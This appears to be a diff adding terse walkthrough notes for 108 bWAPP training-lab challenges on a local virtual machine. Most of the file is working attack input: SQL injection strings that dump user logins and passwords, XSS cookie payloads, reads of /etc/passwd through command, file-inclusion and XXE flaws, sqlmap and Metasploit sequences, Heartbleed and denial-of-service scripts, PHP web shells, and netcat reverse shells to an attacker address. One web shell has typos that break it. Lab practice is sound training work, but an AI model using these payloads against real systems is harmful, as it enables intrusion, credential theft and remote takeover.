@@ -1,0 +1,931 @@
+1. HTML Injection - Reflected (GET)
+
+<h2>HTML Injection - Reflected (GET)</h2>
+
+http://192.168.122.129/bWAPP/htmli_get.php?firstname=%3Ch2%3EHTML+Injection+-+Reflected+%28GET%29%3C%2Fh2%3E&lastname=.&form=submit
+
+
+
+2. HTML Injection - Reflected (POST)
+
+firstname=<h1>HTML+Injection</h1>&lastname=<h1>Reflected+%28POST%29</h1>&form=submit
+
+
+
+3. HTML Injection - Reflected (URL)
+
+
+
+4. HTML Injection - Stored (Blog)
+
+<h1>HTML Injection - Stored (Blog)</h1>
+
+
+
+5. iFrame Injection
+
+http://192.168.122.129/bWAPP/iframei.php?ParamUrl=robots.txt&ParamWidth=250&ParamHeight=250
+
+http://192.168.122.129/bWAPP/iframei.php?ParamUrl=http://192.168.122.129/&ParamWidth=250&ParamHeight=250
+
+
+
+6. OS Injection
+
+www.nsa.gov; cat /etc/passwd
+
+
+
+7. PHP Code Injection
+
+http://192.168.122.129/bWAPP/phpi.php?message=1;%20phpinfo()
+
+
+
+8. Server Side Includes(SSI) Injection
+
+<!--#exec cmd="id" -->
+
+<!--#exec cmd="cat /etc/passwd" -->
+
+
+
+9. SQL Injection (GET/Search)
+
+'
+
+iron' or 1=1#
+
+validEntry' or 1=2#
+
+iron' union select 1,2,3,4,5,6,7 #
+
+iron' union select 1,user(),@@version,4,5,6,7 #
+
+iron' union select 1,login,password,email,5,6,7 from users #
+
+
+
+10. SQL Injection (GET/Select)
+
+movie=1 and 1=2#
+http://192.168.122.129/bWAPP/sqli_2.php?movie=1%20and%201=2#&action=go
+
+movie=1 union select 1,2,3,4,5,6,7#
+http://192.168.122.129/bWAPP/sqli_2.php?movie=1%20union%20select%201,2,3,4,5,6,7#&action=go
+
+movie=1337 union select 1,2,3,4,5,6,7#
+http://192.168.122.129/bWAPP/sqli_2.php?movie=1337%20union%20select%201,2,3,4,5,6,7#&action=go
+
+movie=1337 union select 1,login,3,email,password,6,7 from users#
+http://192.168.122.129/bWAPP/sqli_2.php?movie=1337%20union%20select%201,login,3,email,password,6,7%20from%20users#&action=go
+
+
+
+11. SQL Injection (POST/Search)
+
+iron' or 1=2#
+
+iron' union select 1,2,3,4,5,6,7 #
+
+
+
+12. SQL Injection (POST/Select)
+
+200 union select 1,2,3,4,5,6,7#&action=go
+
+
+
+13. SQL Injection (Login Form/Hero)
+
+' or 1=1#
+
+
+14. SQL Injection (SQLite)
+
+a%' UNION  SELECT 1,sqlite_version(),1,1,1,1; --
+
+
+
+15. SQL Injection - Stored (Blog)
+
+test','test')#
+
+canary1','canary2')#
+
+canary1',(select password from mysql.user where user='root' limit 0,1))#
+
+canary1',(select version()))#
+canary1',(select user()))#
+
+
+
+16. SQL Injection - Stored (User-Agent)
+
+canary1','canary2')#
+
+canary1',(select password from mysql.user where user='root' limit 0,1))#
+
+
+
+17. SQL Injection - Blind - Boolean-Based
+
+test' or 1=1#
+
+This can be leveraged in conjunction with the substring function to identify table names based on true/false responses
+
+
+
+18. SQL Injection - Blind - Time-Based
+
+test'-SLEEP(5)# {loading}
+
+test'-IF(MID(VERSION(),1,1) = '5', SLEEP(5), 0)#
+
+
+
+19. XML/XPath Injection (Login Form)
+
+' or id='2
+
+
+
+20. XML/XPath Injection (Search)
+
+')]/login | a[contains(a,'
+
+')]/password | a[contains(a,'
+
+
+
+21. SQL Injection (SQLite)
+
+a%' UNION  SELECT 1,sqlite_version(),1,1,1,1; --
+
+
+
+22. SQL Injection (AJAX / JSON / jQuery)
+
+a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;-- "
+
+a%' UNION ALL SELECT 1, column_name, null, null, null, null, null from information_schema.columns where table_name="users";-- 
+
+blah%' union all select 1,login,password,email,secret,1, 1 from users --
+
+
+
+23. Broken Auth. - Insecure Login Forms
+
+login: tonystark
+
+password: I am Iron Man
+
+
+
+24. Broken Auth. - Logout Management
+
+
+
+25. Session Mgmt. - Administrative Portals
+
+admin=0 to admin=1
+
+
+
+26. Session Mgmt. - Cookies (HTTPOnly)
+
+yes;hacker_man=hacked<script>alert('Session Mgmt. - Cookies (HTTPOnly)')</script>
+
+
+
+27. Session Mgmt. - Cookies (Secure)
+
+yes;hacker_man=hacked<script>alert('Session Mgmt. - Cookies (Secure)')</script>
+
+
+
+28. Session Mgmt. - Session ID in URL
+
+
+
+29. Broken Auth. - Forgotten Function 
+
+bwapp-bee@mailinator.com
+
+
+
+30. Session Mgmt. - Strong Sessions
+
+
+
+31. Broken Auth. - Weak Passwords
+
+login: test
+password: test
+
+
+
+32. XSS - Reflected (GET) 
+
+<script>alert(document.cookie)</script>
+
+
+
+33. XSS - Reflected (POST)
+
+<script>alert(document.cookie)</script>
+
+
+
+34. XSS - Reflected (JSON) 
+
+"}]}';alert(document.cookie)</script>
+
+
+
+35. XSS - Reflected (AJAX/JSON)
+
+<script>alert(document.cookie)</script>
+
+
+
+36. XSS - Reflected (AJAX/XML)
+
+&lt;img src=&apos;#&apos; onerror=&apos;alert(1)&apos;&gt;
+
+
+
+37. XSS - Reflected (Back Button)
+
+
+
+38. XSS - Reflected (Custom Header)
+
+bWAPP: XSS - Reflected (Custom Header)<script>alert(document.cookie)</script>
+
+
+
+39. XSS - Reflected (Eval)
+
+date=alert(document.cookie)
+
+
+
+40. XSS - Reflected (User-Agent)
+
+User-Agent: <script>alert(document.cookie)</script>
+
+
+
+41. Insecure DOR (Change Secret)
+
+Insecure DOR (Change Secret)
+
+Changed Secret
+
+
+
+42. Insecure DOR (Reset Secret)
+
+
+
+43. Insecure DOR (Order Tickets)
+
+
+
+44. Arbitrary File Access (Samba)
+
+nmap -sS -sV 192.168.122.129
+
+search samba
+use 15
+set RHOST 192.168.122.129
+show options
+
+exploit
+
+
+
+45. Mail Header Injection (SMTP)
+
+BEE
+bwapp@mailinator.com
+Mail Header Injection (SMTP)
+
+/nbcc:customemailaddress.com
+
+
+
+46. OS Command Injection - Blind
+
+192.168.122.130 && nc -vn 192.168.122.130 4444 /bin/bash
+
+
+
+47. SQL Injection (Login Form/User)
+
+bee
+bug
+
+Cookie: security_level=0;
+PHPSESSID=54faec584e43700c5897d748ec5a9024
+
+sqlmap -u "http://192.168.122.129/bWAPP/sqli_16.php" --cookie="security_level=0; PHPSESSID=54faec584e43700c5897d748ec5a9024" --data "login=bee&password=bug&form=submit" --dbs
+
+
+sqlmap -u "http://192.168.122.129/bWAPP/sqli_16.php" --cookie="security_level=0; PHPSESSID=54faec584e43700c5897d748ec5a9024" --data "login=bee&password=bug&form=submit" -D bWAPP -T users --columns
+
+sqlmap -u "http://192.168.122.129/bWAPP/sqli_16.php" --cookie="security_level=0; PHPSESSID=54faec584e43700c5897d748ec5a9024" --data "login=bee&password=bug&form=submit" -D bWAPP -T users -C login,password,secret --dump
+
+
+
+48. Drupal SQL Injection (Drupageddon)
+
+python2 34992.py -h
+
+python2 34992.py --target=http://192.168.122.129/drupal/ --username=Drupal_SQL_Injection-Drupageddon --pwd=Drupal_SQL_Injection-Drupageddon
+
+Drupal_SQL_Injection-Drupageddon
+
+Drupal_SQL_Injection-Drupageddon
+
+
+
+49. SQL Injection - Stored (SQLite)
+
+SQL_Version',(select sqlite_version()))--
+
+',(select sql from sql_master where names='users'))--
+
+User Name',(select login from users))--
+
+Password',(select password from users))--
+
+
+
+50. SQL Injection - Blind (SQLite)
+
+'or 1=1--
+
+'union+select+1,2,sql,4,5,6 from sqlite_master--+-
+
+
+
+51. SQL Injection - Blind (WS/SOAP)
+
+'or 1=1--
+
+' or '1' = '1
+
+' or length(database())=4 and '1'='1
+
+' or length(database())=5 and '1'='1
+
+
+
+52. Broken Auth. - Password Attacks
+
+bee
+
+password
+
+bee 
+bug
+
+
+
+53. XSS - Reflected (HREF)
+
+</script><script>alert(document.cookie)</script>
+
+
+
+54. XSS - Reflected (Login Form)
+
+' or 1=1#
+
+' or 1=1; <script>alert(document.cookie)</script>
+
+
+
+55. XSS - Reflected (PHP_SELF)
+
+<script>alert(document.cookie)</script>
+
+
+
+56. XSS - Stored (Blog) 
+
+<script>alert(document.cookie);document.write(document.cookie)</script>
+
+
+
+57. XSS - Reflected (Referer) 
+
+<script>alert(document.cookie)</script>
+
+
+
+58. XSS - Stored (Change Secret)
+
+"><img src=x onerror=alert(document.cookie)>
+
+
+
+59. XSS - Stored (Cookies) 
+
+
+
+60. SQLiteManager XSS 
+
+?dbsel=&#039;"</script><script>alert(document.cookie)</script>
+
+
+
+61. XSS - Stored (User-Agent) 
+
+<script>alert(document.cookie)</script>
+
+
+
+62. Cross-Site Tracing (XST) 
+
+nmap 192.168.122.129 --script http-methods --script-args http-method.test.all='192.168.122.129'
+
+nikto -h 192.168.122.129
+
+curl -v -X OPTIONS 192.168.122.129
+
+search http trace 
+
+use 1
+
+set RHOST 192.168.122.129
+
+show options
+
+run
+
+
+
+63. Denial-of-Service (Large Chunk Size)
+
+python nginx_dos.py 192.168.122.129:8080
+
+
+
+64. Denial-of-Service (Slow HTTP DoS)
+
+sudo service apache2 start && ./slowloris.py -p 80 -v 192.168.122.129
+
+
+
+65. Denial-of-Service (XML Bomb) 
+
+gnome-system-monitor
+
+After clicking on the “lol” button a red spike on the network for sending data is seen
+
+Using wireshark it is confirmed a package containing the word “lol” has been dispatched
+
+
+
+66. Insecure FTP Configuration 
+
+nmap -sS -sV 192.168.122.129
+
+ftp 192.168.122.129
+
+search tcp login
+
+use 2
+
+set RHOST 192.168.122.129
+
+set USERNAME bee
+
+set PASSWORD bug
+
+run
+
+
+
+67. Insecure SNMP Configuration 
+
+snmp-check 192.168.122.129 -c public -p 161
+
+search snmp login
+
+use 4
+
+set RHOST 192.168.122.129
+
+run
+
+
+
+68. Insecure WebDAV Configuration 
+
+nano Insecure_WebDAV_Configuration.php
+ 
+ <?php
+echo system($_GET['cmd']);
+?>
+
+cavader
+
+open http://192.168.122.129
+
+ls
+
+put Insecure_WebDAV_Configuration.php Insecure_WebDAV_Configuration.php
+
+192.168.122.129/webdav/Insecure_WebDAV_Configuration.php?cmd=id
+
+
+
+69. Man-in-the-Middle Attack (SMTP) 
+
+Target 1: 192.168.122.129
+
+Target 2: 192.168.122.130
+
+
+
+70. Old, Backup & Unreferenced Files 
+
+backd00r.php -> backdoor.php
+c0nfig.inc -> config.inc
+p0rtal.bak -> portal.bak (downloads file)
+p0rtal.zip -> portal.zip (downloads file)
+web.c0nfig -> web.config
+web.c0nfig.bak -> web.config.bak
+wp-c0nfig.bak -> wp-config.bak
+
+
+
+71. Robots File 
+
+192.168.122.129/bWAPP/robots.txt
+
+192.168.122.129/bWAPP/admin/
+
+192.168.122.129/bWAPP/documents/
+
+192.168.122.129/bWAPP/images/
+
+192.168.122.129/bWAPP/passwords/
+
+
+
+72. Base64 Encoding (Secret) 
+
+secret: QW55IGJ1Z3M%2F
+"%2F" indicates "?" 
+
+
+
+73. BEAST/CRIME/BREACH Attacks 
+
+./o-saft.pl +info 192.168.122.129:9443
+
+
+
+74. Clear Text HTTP (Credentials) 
+
+Login: bee
+
+Password: bug
+
+
+
+75. Heartbleed Vulnerability 
+
+nmap -p8443 --script -heartbleed 192.168.122.129
+
+https://192.168.122.129:8443/bWAPP/login.php
+
+sudo python2 heartbleed.py 192.168.122.129
+
+search heartbleed
+
+use 4
+
+set RHOST 192.168.122.129
+
+set RPORT 8443
+
+show options
+
+set action dump
+
+run
+
+
+
+76. HTML5 Web Storage (Secret) 
+
+alert(localStorage.getItem('secret'))
+
+view-source:http://192.168.122.129/bWAPP/insecure_crypt_storage_1.php
+
+
+
+77. POODLE Vulnerability 
+
+nmap --script  ssl-poodle -sV -p 443 192.168.122.129
+
+
+
+78. SSL 2.0 Depreciated Protocol 
+
+about:config
+
+tls
+
+4 -> 1
+3 -> 1
+
+./o-saft.pl +check 192.168.122.129:9443
+
+./o-saft.pl +info 192.168.122.129:9443
+ 
+./o-saft.pl +cipher 192.168.122.129:9443
+
+
+
+79. Text Files (Accounts)
+
+Username: Text Files
+
+Password: (Accounts)
+
+
+
+80. Directory Traversal - Directories  
+
+192.168.122.129/bWAPP/directory_traversal_2.php?directory=documents/../../../../
+
+
+
+81. Directory Traversal - Files 
+
+http://192.168.122.129/bWAPP/directory_traversal_1.php?page=message.txt
+
+http://192.168.122.129/bWAPP/directory_traversal_1.php?page=../../../etc/passwd
+
+
+
+82. Host Header Attack (Cache Poisoning) 
+
+www.google.com#
+
+
+
+83. SQLiteManager Local File Inclusion 
+
+SQLiteManager Local File Inclusion
+
+<script>alert(document.cookie)</script>
+
+
+
+84. Remote & Local File Inclusion (RFI or LFI) 
+
+http://192.168.122.129/bWAPP/rlfi.php?language=../../../etc/passwd&action=go
+
+http://192.168.122.129/bWAPP/rlfi.php?language=http://google.com&action=go
+
+
+
+85. Restrict Device Access
+
+firefox extension name: User Agent Switcher 
+
+
+
+86. Restrict Folder Access 
+
+http://192.168.122.129/bWAPP/documents/Iron_Man.pdf
+
+http://192.168.122.129/bWAPP/documents/
+
+
+
+87. Server Side Request Forgery (SSRF)
+
+
+a. Port scan hosts on the internal network using RFI
+
+http://192.168.122.129/bWAPP/rlfi.php?language=lang_en.php&action=go
+
+http://192.168.122.129/bWAPP/rlfi.php?language=http://192.168.122.129/evil/ssrf-1.txt&ip=192.168.122.129&action=go
+
+
+b. Access resources on the internal network using XXE
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "http://localhost/bWAPP/robots.txt">
+]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY bWAPP SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/bWAPP/passwords/heroes.xml">
+]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
+
+
+
+88. XML External Entity Attacks (XXE) 
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root
+[
+<!ENTITY XXE SYSTEM "file:///etc/passwd">
+]>
+<reset><login>&XXE;</login><secret>XML External Entity Attacks (XXE)</secret></reset>
+
+
+
+89. CSRF (Change Password)
+
+newpassword
+
+changedpassword
+
+
+
+90. CSRF (Change Secret) 
+
+CSRF (Change Secret)
+
+Right click and press on Anti-CSRF Test FORM 
+
+
+
+91. CSRF (Transfer Amount) 
+
+account=123-45678-90&amount=10
+
+account=098-76543-21&amount=999
+
+
+
+92. Drupal SQL Injection (Drupageddon)
+
+http://192.168.122.129/drupal/
+
+php 34993.php
+
+Username: admin
+Password: admin
+
+
+
+93. Heartbleed vulnerability
+
+https://192.168.122.129:8443/bWAPP/login.php
+
+nmap --script  ssl-heartbleed -sV -p 8443 192.168.122.129
+
+https://192.168.122.129:8443/bWAPP/login.php
+
+python2 heartbleed.py 192.168.122.129
+
+search heartbleed
+
+use 2
+
+set RHOST 192.168.122.129
+
+set RPORT 8443
+
+show options
+
+set verbose true
+
+run
+
+
+
+94. PHP CGI Remote Code Execution
+
+http://192.168.122.129/bWAPP/admin/phpinfo.php
+
+http://192.168.122.129/bWAPP/admin/?-s
+
+http://192.168.122.129/bWAPP/admin/?-dauto_prepend_file%3d/etc/passwd+-n
+
+
+
+95. PHP Eval Function 
+ 
+http://192.168.122.129/bWAPP/php_eval.php?eval=echo "PHP Eval Function";
+
+http://192.168.122.129/bWAPP/php_eval.php?eval=echo shell_exec("cat /etc/passwd");
+
+nc -lvp 4444
+
+http://192.168.122.129/bWAPP/php_eval.php?eval=echo shell_exec("nc -e /bin/sh 192.168.122.130 4444");
+
+
+
+96. Unvalidated Redirects & Forwards (1) 
+
+http://192.168.122.129/bWAPP/
+
+
+
+97. Unvalidated Redirects & Forwards (2) 
+
+login.php
+
+
+
+98. ClickJacking (Movie Tickets)
+
+view-source:http://192.168.122.129/evil/clickjacking.htm
+
+
+
+99. Client-Side Validation (Password)
+
+newbug
+
+changedbug
+
+
+
+100. HTTP Parameter Pollution 
+
+&movie=2
+
+
+
+101. HTTP Response Splitting 
+
+%0AReferer%3A192.168.122.129
+
+
+
+102. HTTP Verb Tampering 
+
+newbug
+
+GET /bWAPP/http_verb_tampering.php?password_new=newbug&password_conf=newbug&action=change HTTP/1.1
+
+
+
+103. Information Disclosure - Favicon
+
+Favicon: drupal
+
+
+
+104. Information Disclosure - Headers
+
+Server: Apache/2.2.8 (Ubuntu) DAV/2 mod_fastcgi/2.4.6 PHP/5.2.4-2ubuntu5 with Suhosin-Patch mod_ssl/2.2.8 OpenSSL/0.9.8g
+
+
+
+105. Information Disclosure - PHP Version
+
+
+
+106. Information Disclosure - Robots File 
+
+http://192.168.122.129/bWAPP/admin/
+
+http://192.168.122.129/bWAPP/passwords/
+
+http://192.168.122.129/bWAPP/passwords/heroes.xml
+
+
+
+107. Insecure iFrame (Login Form) 
+
+bee 
+
+bug
+
+http://192.168.122.129/bWAPP/passwords/
+
+
+
+108. Unrestricted File Upload 
+
+<?php
+  if(isset($_REQUEST['cmd']))}
+  	   echo "<pre>";
+  	   $cmd = ($_REQUEST['cmd']);
+  	   systen($cmd) ;
+  	   echo "</pre>";
+  	   die;
+  }
+?>
+
+http://192.168.122.129/bWAPP/images/Unrestricted%20File%20Upload.php?cmd=cat+/etc/passwd
+
+
